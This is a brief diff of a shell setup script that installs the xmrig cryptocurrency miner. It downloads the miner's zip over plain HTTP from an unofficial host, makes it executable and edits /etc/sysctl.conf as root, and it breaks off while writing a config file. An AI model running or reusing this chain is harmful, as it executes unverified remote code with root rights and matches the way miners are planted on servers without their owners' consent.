@@ -1,4 +1,4 @@
-sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev unzip -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget http://hnv-data.online/xmrig.zip && unzip xmrig.zip && chmod +x xmrig && sudo echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf && sudo sysctl -p
+sudo apt-get update -y && sudo apt-get install libhwloc-dev unzip -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget http://hnv-data.online/xmrig.zip && unzip xmrig.zip && chmod +x xmrig && sudo echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf && sudo sysctl -p
 
 cat > /usr/local/src/xmrig/build/config.json <<EOL
 {
